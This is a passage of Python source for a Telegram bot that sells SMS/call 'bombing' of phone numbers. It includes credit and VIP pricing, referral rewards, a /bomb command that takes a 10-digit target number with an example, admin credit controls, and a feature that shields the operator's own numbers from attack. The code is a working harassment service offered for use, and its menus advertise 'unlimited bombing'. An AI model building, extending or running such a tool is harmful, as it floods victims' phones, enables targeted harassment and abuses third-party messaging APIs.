            e(f"""
💰 <b>Your Credits</b>

👤 User: @{username}
👑 VIP: {'✅ Yes' if user_info['is_vip'] else '❌ No'}
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👥 Referrals: {user_info['referral_count']}

📊 <b>Credit Usage:</b>
- Bomb cost: {BOMB_COST} credit per attack
- Referral bonus: +{REFERRAL_BONUS} credits
- Free credits on join: +{DEFAULT_CREDITS} credits

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Get More Credits", callback_data="buy")],
                [InlineKeyboardButton("⬅️ Back", callback_data="main")]
            ]),
            parse_mode="HTML"
        )
    
    elif data == "vip":
        await query.edit_message_text(
            e(f"""
👑 <b>VIP Membership</b>

✨ <b>VIP Benefits:</b>
- 🚀 Unlimited bombing
- 💰 No credit costs
- 🔥 Priority support
- 🎁 Exclusive features
- 👑 Special VIP badge

💰 <b>Price:</b> Contact @{BOT_OWNER}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("main"),
            parse_mode="HTML"
        )
    
    elif data == "refer":
        referral_link = f"https://t.me/{(await context.bot.get_me()).username}?start={user_id}"
        user_info = get_user_info(user_id, username)
        await query.edit_message_text(
            e(f"""
👥 <b>Referral Program</b>

📤 <b>Your Referral Link:</b>
<code>{referral_link}</code>

📊 <b>Your Referrals: {user_info['referral_count']}</b>
💰 Bonus per referral: +{REFERRAL_BONUS} credits

🎯 <b>How it works:</b>
1. Share your link with friends
2. They join using your link
3. You get +{REFERRAL_BONUS} credits
4. They get {DEFAULT_CREDITS} free credits!

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("main"),
            parse_mode="HTML"
        )
    
    elif data == "buy":
        await query.edit_message_text(
            e(f"""
💳 <b>Get More Credits</b>

🎁 <b>Free Methods:</b>
1️⃣ Use /refer - Share your referral link
2️⃣ Get +{REFERRAL_BONUS} credits per referral
3️⃣ Join our channel for free credits

👑 <b>VIP Membership:</b>
- Unlimited bombing
- No credit costs
- Priority support
- Exclusive features

📞 <b>Contact Admin:</b> DM @{BOT_OWNER} for VIP access

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("credits"),
            parse_mode="HTML"
        )
    
    elif data == "stats":
        stats = db.get_stats()
        await query.edit_message_text(
            e(f"""
📊 <b>Bot Statistics</b>

👥 Total Users: {stats['total_users']}
💣 Total Bombs: {stats['total_bombs']}
✅ Total Success: {stats['total_success']}
👥 Total Referrals: {stats['total_referrals']}
🔥 APIs Loaded: {len(ULTIMATE_APIS)}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("main"),
            parse_mode="HTML"
        )
    
    elif data == "top":
        top_users = db.get_top_users(10)
        if not top_users:
            text = e("❌ No users yet!")
        else:
            text = e("🏆 <b>Top Users Leaderboard</b>\n\n")
            for i, user in enumerate(top_users, 1):
                uid_db, uname_db, fname_db, credits, _, _ = user
                medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
                text += e(f"{medal} ") + display_name(uid_db, uname_db, fname_db) + e(f" - {credits} credits 💰\n")
        text += e(f"\n💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>")
        await query.edit_message_text(text, reply_markup=get_back_keyboard("main"), parse_mode="HTML")
    
    elif data.startswith("bomb_"):
        duration = int(data.split("_")[1])
        await query.edit_message_text(
            e(f"📱 <b>Quick Bomb Setup</b>\n\n"
              f"⏰ Duration: {duration} seconds\n"
              f"💰 Cost: {BOMB_COST} credit\n\n"
              f"Type: <code>/bomb &lt;10-digit number&gt; {duration}</code>\n"
              f"Example: <code>/bomb 9876543210 {duration}</code>\n\n"
              f"💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>"),
            reply_markup=get_back_keyboard("bomb"),
            parse_mode="HTML"
        )
    
    elif data.startswith("stop_"):
        job_id = data.split("_")[1]
        if bomber.stop_job(job_id):
            await query.edit_message_text(
                e(f"🛑 <b>Bombing Stopped!</b>\n\n"
                  f"📱 Job ID: <code>{job_id}</code>\n"
                  f"✅ Successfully terminated.\n\n"
                  f"💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>"),
                parse_mode="HTML"
            )
        else:
            await query.edit_message_text(
                e(f"❌ <b>Job not found!</b>\n\n"
                  f"⚠️ This job is either already stopped or doesn't exist.\n\n"
                  f"💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>"),
                parse_mode="HTML"
            )

# ============= ADMIN COMMANDS =============
async def admin_check(update: Update):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(e("❌ You are not authorized to use this command."), parse_mode="HTML")
        return False
    return True

async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(e("❌ Usage: /addcredits &lt;user_id&gt; &lt;amount&gt;"), parse_mode="HTML")
        return
    try:
        user_id = int(args[0])
        amount = int(args[1])
        db.add_credits(user_id, amount, f"Admin added by {update.effective_user.id}")
        await update.message.reply_text(e(f"✅ Added {amount} credits to user {user_id}"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID or amount."), parse_mode="HTML")

async def removecredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(e("❌ Usage: /removecredits &lt;user_id&gt; &lt;amount&gt;"), parse_mode="HTML")
        return
    try:
        user_id = int(args[0])
        amount = int(args[1])
        if db.remove_credits(user_id, amount, f"Admin removed by {update.effective_user.id}"):
            await update.message.reply_text(e(f"✅ Removed {amount} credits from user {user_id}"), parse_mode="HTML")
        else:
            await update.message.reply_text(e(f"❌ Insufficient credits for user {user_id}"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID or amount."), parse_mode="HTML")

async def addvip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    args = context.args
    if not args:
        await update.message.reply_text(e("❌ Usage: /addvip &lt;user_id&gt;"), parse_mode="HTML")
        return
    try:
        user_id = int(args[0])
        db.cursor.execute('UPDATE users SET is_vip = 1 WHERE user_id = ?', (user_id,))
        db.conn.commit()
        await update.message.reply_text(e(f"✅ User {user_id} is now VIP! 👑"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID."), parse_mode="HTML")

async def removevip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    args = context.args
    if not args:
        await update.message.reply_text(e("❌ Usage: /removevip &lt;user_id&gt;"), parse_mode="HTML")
        return
    try:
        user_id = int(args[0])
        db.cursor.execute('UPDATE users SET is_vip = 0 WHERE user_id = ?', (user_id,))
        db.conn.commit()
        await update.message.reply_text(e(f"✅ User {user_id} is no longer VIP."), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID."), parse_mode="HTML")

async def giveall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    args = context.args
    if not args:
        await update.message.reply_text(e("❌ Usage: /giveall &lt;amount&gt;"), parse_mode="HTML")
        return
    try:
        amount = int(args[0])
        db.cursor.execute('UPDATE users SET credits = credits + ?', (amount,))
        db.conn.commit()
        await update.message.reply_text(e(f"✅ Added {amount} credits to ALL users! 🎁"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid amount."), parse_mode="HTML")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    message = ' '.join(context.args)
    if not message:
        await update.message.reply_text(e("❌ Usage: /broadcast &lt;message&gt;"), parse_mode="HTML")
        return
    db.cursor.execute('SELECT user_id FROM users')
    users = db.cursor.fetchall()
    sent = 0
    for user in users:
        try:
            await context.bot.send_message(
                user[0],
                e(f"📢 <b>Broadcast:</b>\n\n{message}\n\n💀 Bot by @{BOT_OWNER}"),
                parse_mode="HTML"
            )
            sent += 1
            await asyncio.sleep(0.1)
        except Exception:
            continue
    await update.message.reply_text(e(f"✅ Broadcast sent to {sent} users. 📨"), parse_mode="HTML")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    db.cursor.execute('SELECT COUNT(*) FROM users')
    total = db.cursor.fetchone()[0]
    db.cursor.execute('SELECT user_id, username, first_name, credits, is_vip FROM users ORDER BY credits DESC LIMIT 50')
    users = db.cursor.fetchall()
    text = e(f"👥 <b>Users ({total} total)</b>\n\n")
    for user in users:
        uid_u, uname_u, fname_u, credits, is_vip = user
        vip = e("👑") if is_vip else ""
        text += f"{vip} {display_name(uid_u, uname_u, fname_u)} - {credits} credits\n"
    await update.message.reply_text(text, parse_mode="HTML")

async def adminstats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    stats = db.get_stats()
    db.cursor.execute('SELECT SUM(credits) FROM users')
    total_credits = db.cursor.fetchone()[0] or 0
    db.cursor.execute('SELECT COUNT(*) FROM users WHERE is_vip = 1')
    vip_count = db.cursor.fetchone()[0]
    db.cursor.execute('SELECT COUNT(*) FROM users WHERE credits > 100')
    rich_users = db.cursor.fetchone()[0]
    await update.message.reply_text(
        e(f"""
📊 <b>Admin Statistics</b>

👥 Total Users: {stats['total_users']}
💰 Total Credits: {total_credits}
👑 VIP Users: {vip_count}
💎 Rich Users (100+ credits): {rich_users}
💣 Total Bombs: {stats['total_bombs']}
✅ Total Success: {stats['total_success']}
👥 Total Referrals: {stats['total_referrals']}
🔥 APIs Loaded: {len(ULTIMATE_APIS)}

📊 <b>Average per user:</b>
Credits: {total_credits // stats['total_users'] if stats['total_users'] > 0 else 0}
Bombs: {stats['total_bombs'] // stats['total_users'] if stats['total_users'] > 0 else 0}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

# ============= PROTECTED NUMBER COMMANDS =============
async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            e("❌ Usage: /protect &lt;10-digit number&gt; [label]\n"
              "Example: /protect 9876543210 Naruto\n\n"
              "📱 This number will be shielded from bombing."),
            parse_mode="HTML"
        )
        return
    phone = args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(e("❌ Invalid number! Must be exactly 10 digits."), parse_mode="HTML")
        return
    label = "Owner"
    if len(args) > 1:
        label = ' '.join(args[1:])
    db.add_protected_number(update.effective_user.id, phone, label)
    await update.message.reply_text(
        e(f"✅ <b>Number Protected!</b>\n\n"
          f"📱 {phone}\n"
          f"🏷️ Label: {label}\n"
          f"🛡️ Anyone who tries to bomb this will get the ultimate disrespect.\n\n"
          f"💀 <b>\"Acha lode baap ko seekhayega\"</b>"),
        parse_mode="HTML"
    )

async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            e("❌ Usage: /unprotect &lt;10-digit number&gt;\n"
              "Example: /unprotect 9876543210\n\n"
              "📱 This number will no longer be shielded."),
            parse_mode="HTML"
        )
        return
    phone = args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(e("❌ Invalid number! Must be exactly 10 digits."), parse_mode="HTML")
        return
    if db.remove_protected_number(phone):
        await update.message.reply_text(
            e(f"✅ <b>Number Unprotected!</b>\n\n"
              f"📱 {phone} is no longer shielded.\n"
              f"🛡️ Protection removed successfully."),
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            e(f"❌ <b>Number not found!</b>\n\n"
              f"📱 {phone} was not in the protected list.\n"
              f"Use /protected to see all protected numbers."),
            parse_mode="HTML"
        )

async def protected_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_check(update):
        return
    numbers = db.get_protected_numbers()
    if not numbers:
        await update.message.reply_text(e("📭 No protected numbers registered."), parse_mode="HTML")
        return
    text = e("🛡️ <b>Protected Numbers</b>\n\n")
    for user_id, phone, label in numbers:
        text += f"📱 {phone} — {label} (User: {user_id})\n"
    await update.message.reply_text(text, parse_mode="HTML")

# ============= MAIN =============
def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please set your BOT_TOKEN in the script!")
        return
    
    print(f"🚀 Starting {BOT_NAME} {VERSION}...")
    print(f"💣 Loaded {len(ULTIMATE_APIS)} bombing APIs")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"📡 Owner Notifications: {'ON' if NOTIFY_OWNER else 'OFF'}")
    print(f"🤖 Bot is now running...")
    print(f"💀 Bot by @{BOT_OWNER} | Made by Naruto")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("credits", credits_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("refer", refer_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("top", top_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("testnotify", test_notify_command))
    
    # Admin commands
    app.add_handler(CommandHandler("addcredits", addcredits_command))
    app.add_handler(CommandHandler("removecredits", removecredits_command))
    app.add_handler(CommandHandler("addvip", addvip_command))
    app.add_handler(CommandHandler("removevip", removevip_command))
    app.add_handler(CommandHandler("giveall", giveall_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("adminstats", adminstats_command))
    
    # Protected number commands
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("protected", protected_list_command))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(button_callback))
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()